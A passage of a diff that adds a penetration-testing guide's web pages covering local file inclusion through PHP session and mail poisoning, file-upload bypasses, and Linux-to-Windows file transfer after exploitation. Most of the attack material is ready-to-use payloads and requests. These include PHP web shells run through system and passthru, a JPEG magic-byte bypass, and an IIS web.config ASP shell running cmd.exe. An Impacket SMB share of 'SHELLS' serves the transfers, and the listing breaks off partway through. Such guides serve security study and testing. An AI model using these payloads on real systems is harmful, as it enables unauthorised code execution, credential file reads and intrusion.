+<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="k">pass</span><span class="o">=</span><span class="n">admin</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">29</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
+</pre></div>
+</div>
+<p>As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27</p>
+<p>Now, we can write the cookie with a php command</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+Content-Length: 134
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;&amp;pass=password&amp;lang=en_us.php
+</pre></div>
+</div>
+<p>This would result in</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">user</span><span class="o">=%</span><span class="mi">3</span><span class="n">C</span><span class="o">%</span><span class="mi">3</span><span class="n">Fphp</span><span class="o">+</span><span class="n">system</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">22</span><span class="n">cat</span><span class="o">+%</span><span class="mi">2</span><span class="n">Fetc</span><span class="o">%</span><span class="mi">2</span><span class="n">Fpasswd</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">F</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">53</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
+</pre></div>
+</div>
+<p>Now, the php command can be executed using</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 141
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+</pre></div>
+</div>
+<p>The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)</p>
+</section>
+<section id="email-server">
+<h4>Email Server<a class="headerlink" href="#email-server" title="Link to this heading"></a></h4>
+<p>If the email server allows you to send email unauthorized and we know the usernames on the system, we probably can utilize it to do remote code execution by using telnet and connecting to port 25</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>EHLO example.com
+VRFY username@example.com
+MAIL FROM: pwned@domain.com
+RCPT TO: username@example.com
+DATA
+
+Subject: Owned
+&lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&gt;
+
+.
+
+Mail Queued
+</pre></div>
+</div>
+<p>and as we have LFI, we can read the email by</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">../../../</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">username</span> <span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+</pre></div>
+</div>
+<p>The above would probably differ on the request of your LFI.</p>
+</section>
+</section>
+</section>
+<section id="a2-file-upload">
+<span id="id1"></span><h2>A2: File Upload<a class="headerlink" href="#a2-file-upload" title="Link to this heading"></a></h2>
+<section id="examples">
+<h3>Examples<a class="headerlink" href="#examples" title="Link to this heading"></a></h3>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>If sometimes, we are trying to upload a php file and it’s not a allowed extension, maybe try with php5 extension. The file extension tells the web server which version of PHP to use.
+Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5.</p>
+</div>
+<section id="simple-file-upload">
+<h4>Simple File Upload<a class="headerlink" href="#simple-file-upload" title="Link to this heading"></a></h4>
+<p>Intercepting the request in Burp/ ZAP and changing the file-extension.</p>
+<p>Below is the PHP code</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?
+
+function genRandomString() {
+  $length = 10;
+  $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
+  $string = &quot;&quot;;
+
+  for ($p = 0; $p &lt; $length; $p++) {
+      $string .= $characters[mt_rand(0, strlen($characters)-1)];
+  }
+
+  return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+  do {
+  $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
+  } while(file_exists($path));
+  return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+  $ext = pathinfo($fn, PATHINFO_EXTENSION);
+  return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists(&quot;filename&quot;, $_POST)) {
+  $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);
+
+
+      if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
+      echo &quot;File is too big&quot;;
+  } else {
+      if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
+          echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
+      } else{
+          echo &quot;There was an error uploading the file, please try again!&quot;;
+      }
+  }
+} else {
+?&gt;
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
+Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
+&lt;/form&gt;
+&lt;? } ?&gt;
+</pre></div>
+</div>
+<p>If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.</p>
+<ul>
+<li><p>Create a fake JPG containing php code.</p>
+<p>We’ll be using system() to read our password.</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;&lt;?php system($_GET[&quot;</span><span class="n">cmd</span><span class="s2">&quot;]); ?&gt;&quot;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">jpg</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Upload JPG, intercept in Burp/ ZAP and change the extension</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;filename&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;o0xn5q93si.jpg&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="o">&gt;</span>
+
+<span class="ow">is</span> <span class="n">changed</span> <span class="n">to</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;filename&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;o0xn5q93si.php&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+<section id="simple-file-upload-with-verifying-image-type">
+<h4>Simple File Upload - With verifying image type<a class="headerlink" href="#simple-file-upload-with-verifying-image-type" title="Link to this heading"></a></h4>
+<p>In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+...
+
+else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {
+      echo &quot;File is not an image&quot;;
+  }
+
+...
+
+?&gt;
+</pre></div>
+</div>
+<p>Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a “Magic Number” at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.</p>
+<ul class="simple">
+<li><p>Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let’s say first 100 bytes)</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hexdump</span> <span class="o">-</span><span class="n">n</span> <span class="mi">100</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;100/1 &quot;</span><span class="se">\\</span><span class="s1">x</span><span class="si">%02X</span><span class="s1">&quot; &quot;</span><span class="se">\n</span><span class="s1">&quot;&#39;</span> <span class="n">sunflower</span><span class="o">.</span><span class="n">jpg</span>
+
+<span class="o">-</span><span class="n">n</span> <span class="n">length</span>         <span class="p">:</span> <span class="n">Interpret</span> <span class="n">only</span> <span class="n">length</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">Input</span>
+<span class="o">-</span><span class="n">e</span> <span class="n">format_string</span>  <span class="p">:</span> <span class="n">Specify</span> <span class="n">a</span> <span class="nb">format</span> <span class="n">string</span> <span class="n">to</span> <span class="n">be</span> <span class="n">used</span> <span class="k">for</span> <span class="n">displaying</span> <span class="n">data</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hexdump</span> <span class="o">-</span><span class="n">n</span> <span class="mi">100</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;100/1 &quot;</span><span class="se">\\</span><span class="s1">x</span><span class="si">%02X</span><span class="s1">&quot; &quot;</span><span class="se">\n</span><span class="s1">&quot;&#39;</span> <span class="n">sunflower</span><span class="o">.</span><span class="n">jpg</span>
+\<span class="n">xFF</span>\<span class="n">xD8</span>\<span class="n">xFF</span>\<span class="n">xE0</span>\<span class="n">x00</span>\<span class="n">x10</span>\<span class="n">x4A</span>\<span class="n">x46</span>\<span class="n">x49</span>\<span class="n">x46</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x2C</span>\<span class="n">x01</span>\<span class="n">x2C</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xFF</span>\<span class="n">xE1</span>\<span class="n">x00</span>\<span class="n">x16</span>\<span class="n">x45</span>\<span class="n">x78</span>\<span class="n">x69</span>\<span class="n">x66</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x4D</span>\<span class="n">x4D</span>\<span class="n">x00</span>\<span class="n">x2A</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x08</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xFF</span>\<span class="n">xDB</span>\<span class="n">x00</span>\<span class="n">x43</span>\<span class="n">x00</span>\<span class="n">x05</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x03</span>\<span class="n">x05</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x05</span>\<span class="n">x05</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x07</span>\<span class="n">x0C</span>\<span class="n">x08</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x0F</span>\<span class="n">x0B</span>\<span class="n">x0B</span>\<span class="n">x09</span>\<span class="n">x0C</span>\<span class="n">x11</span>\<span class="n">x0F</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x11</span>\<span class="n">x0F</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x13</span>\<span class="n">x16</span>\<span class="n">x1C</span>\<span class="n">x17</span>\<span class="n">x13</span>\<span class="n">x14</span>\<span class="n">x1A</span>\<span class="n">x15</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x18</span>\<span class="n">x21</span>\<span class="n">x18</span>\<span class="n">x1A</span>\<span class="n">x1D</span>\<span class="n">x1D</span>\<span class="n">x1F</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul>
+<li><p>Create a file with JPG header and command shell code using python</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;The Hexdump from above </span><span class="se">\xFF\xD8\xFF\xE0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+</div>
+</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Do check the source code of the page for any client-side file validation or any commented hidden parameters?</p>
+</div>
+<p>We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.</p>
+</section>
+<section id="modifying-file-upload-page">
+<h4>Modifying File Upload Page<a class="headerlink" href="#modifying-file-upload-page" title="Link to this heading"></a></h4>
+<p>Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there’s a LFI and we have seen the code of upload function. The first thing to check would be “What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc.”</p>
+<p>Let’s say, there is a upload form which has a text-field for accepting input (Let’s say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let’s see the current form in inspect-element.</p>
+<p>Client-Side Code</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&quot;multipart/form-data&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;?op=upload&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
+   <span class="o">&lt;</span><span class="n">textarea</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:400px; height:150px;&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">textarea</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span>
+       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
+   <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;Send Tip!&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>If we see the above form, accepts two inputs</p>
+<ul class="simple">
+<li><p>text type field named sinfo for providing detailed information about the server and</p></li>
+<li><p>text type field named name for providing name of the server.</p></li>
+</ul>
+<p>Let’s also see, serverside code</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>if(isset($_POST[&#39;submit&#39;]) &amp;&amp; isset($_POST[&#39;sinfo&#39;])) {
+               $tip = $_POST[&#39;sinfo&#39;];
+               $secretname = Random_Filename();  ## Generates a random file name
+           $location = Random_Number();      ## Generate a random number
+               file_put_contents(&quot;uploads/&quot;. $location . &#39;/&#39; . $secretname,  $sinfo);
+</pre></div>
+</div>
+<p>If we see, the contents of sinfo are directly put in a file.</p>
+<p>In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&quot;multipart/form-data&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;?op=upload&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
+<span class="c1">#  &lt;textarea style=&quot;width:400px; height:150px;&quot; id=&quot;sinfo&quot; name=&quot;sinfo&quot;&gt; &lt;/textarea&gt;&lt;br&gt; ---------- We have commented this and add the below line.</span>
+       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;file&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
+       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
+   <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;Send Tip!&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!</p>
+</div>
+</section>
+<section id="iis-web-config-upload">
+<h4>IIS - Web.config Upload<a class="headerlink" href="#iis-web-config-upload" title="Link to this heading"></a></h4>
+<p>If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.</p>
+<p>A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.</p>
+<p>With a web.config file, you can control:</p>
+<ul class="simple">
+<li><p>Database connection strings.</p></li>
+<li><p>Error behavior.</p></li>
+<li><p>Security.</p></li>
+</ul>
+<p>Refer <a class="reference external" href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">Upload a web.config File for Fun &amp; Profit</a> and <a class="reference external" href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">RCE by uploading a web.config</a></p>
+<p>We can upload the below web.config</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+  &lt;system.webServer&gt;
+     &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+        &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+     &lt;/handlers&gt;
+     &lt;security&gt;
+        &lt;requestFiltering&gt;
+           &lt;fileExtensions&gt;
+              &lt;remove fileExtension=&quot;.config&quot; /&gt;
+           &lt;/fileExtensions&gt;
+           &lt;hiddenSegments&gt;
+              &lt;remove segment=&quot;web.config&quot; /&gt;
+           &lt;/hiddenSegments&gt;
+        &lt;/requestFiltering&gt;
+     &lt;/security&gt;
+  &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;%
+set cmd = Request.QueryString(&quot;cmd&quot;)
+Set os = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
+output = os.exec(&quot;cmd.exe /c &quot; + cmd).stdout.readall
+response.write output
+%&gt;
+</pre></div>
+</div>
+<p>The above expects a parameter cmd which is executed using wscript.shell and can be executed like</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/uploads/web.config?cmd=whoami
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+<section id="a3-transferring-files-from-linux-to-windows-post-exploitation">
+<span id="a3-tranfer-files-from-linux-to-windows"></span><h2>A3: Transferring Files from Linux to Windows (post-exploitation)<a class="headerlink" href="#a3-transferring-files-from-linux-to-windows-post-exploitation" title="Link to this heading"></a></h2>
+<p>There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from <a class="reference external" href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/">Transferring Files from Linux to Windows (post-exploitation)</a> Here are the few methods</p>
+<section id="smb">
+<h3>SMB<a class="headerlink" href="#smb" title="Link to this heading"></a></h3>
+<p>We need to setup a SMB Server on the Debian/ Kali machine</p>
+<section id="smb-server-attacker">
+<h4>SMB Server - Attacker<a class="headerlink" href="#smb-server-attacker" title="Link to this heading"></a></h4>
+<p>We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>/usr/share/doc/python-impacket/examples/smbserver.py
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
+                   shareName sharePath
+
+This script will launch a SMB Server and add a share specified as an argument.
+You need to be root in order to bind to port 445. No authentication will be
+enforced. Example: smbserver.py -comment &#39;My share&#39; TMP /tmp
+
+positional arguments:
+ shareName         name of the share to add
+ sharePath         path of the share to add
+
+optional arguments:
+ -h, --help        show this help message and exit
+ -comment COMMENT  share&#39;s comment to display when asked for shares
+ -debug            Turn DEBUG output ON
+ -smb2support      SMB2 Support (experimental!)
+</pre></div>
+</div>
+<p>So, we can setup by using</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">smbserver</span><span class="o">.</span><span class="n">py</span> <span class="n">SHELLS</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">SHELLS</span>
+
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.15</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2002</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Callback</span> <span class="n">added</span> <span class="k">for</span> <span class="n">UUID</span> <span class="mi">4</span><span class="n">B324FC8</span><span class="o">-</span><span class="mi">1670</span><span class="o">-</span><span class="mi">01</span><span class="n">D3</span><span class="o">-</span><span class="mi">1278</span><span class="o">-</span><span class="mi">5</span><span class="n">A47BF6EE188</span> <span class="n">V</span><span class="p">:</span><span class="mf">3.0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Callback</span> <span class="n">added</span> <span class="k">for</span> <span class="n">UUID</span> <span class="mi">6</span><span class="n">BFFD098</span><span class="o">-</span><span class="n">A112</span><span class="o">-</span><span class="mi">3610</span><span class="o">-</span><span class="mi">9833</span><span class="o">-</span><span class="mi">46</span><span class="n">C3F87E345A</span> <span class="n">V</span><span class="p">:</span><span class="mf">1.0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Config</span> <span class="n">file</span> <span class="n">parsed</span>
+</pre></div>
+</div>
+</section>
+<section id="accessing-the-share-linux">
+<h4>Accessing the share - Linux<a class="headerlink" href="#accessing-the-share-linux" title="Link to this heading"></a></h4>
+<p>We can use smbclient to access the share</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>smbclient -L 10.10.10.10 --no-pass
+WARNING: The &quot;syslog&quot; option is deprecated
+
+       Sharename       Type      Comment
+       ---------       ----      -------
+       IPC$            Disk
+       SHELLS          Disk
+ Reconnecting with SMB1 for workgroup listing.
+ Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
+ Failed to connect with SMB1 -- no workgroup available
+</pre></div>
+</div>
+</section>
+<section id="accessing-the-share-windows">
+<h4>Accessing the share - Windows<a class="headerlink" href="#accessing-the-share-windows" title="Link to this heading"></a></h4>
+<p>We can use net view to check the shares</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">view</span> \\<span class="mf">10.10.10.10</span>
+
+<span class="n">Shared</span> <span class="n">resources</span> <span class="n">at</span> \\<span class="mf">10.10.10.10</span>
+
+<span class="p">(</span><span class="n">null</span><span class="p">)</span>
+
+<span class="n">Share</span> <span class="n">name</span> <span class="n">Type</span> <span class="n">Used</span> <span class="k">as</span> <span class="n">Comment</span>
+<span class="o">-------------------------------</span>
+<span class="n">SHELLS</span>     <span class="n">Disk</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">sucessfully</span>
+</pre></div>
+</div>
+</section>
+<section id="copying-the-files-windows">
+<h4>Copying the Files - Windows<a class="headerlink" href="#copying-the-files-windows" title="Link to this heading"></a></h4>
+<p>From the Windows Command Prompt</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">dir</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>
+
+<span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+<span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="ow">is</span> <span class="n">ABCD</span><span class="o">-</span><span class="n">EFAA</span>
+
+<span class="n">Directory</span> <span class="n">of</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>
+
+<span class="mi">04</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">47</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+<span class="mi">04</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">06</span><span class="p">:</span><span class="mi">25</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+<span class="mi">04</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">47</span> <span class="n">AM</span>            <span class="mi">73</span><span class="p">,</span><span class="mi">802</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
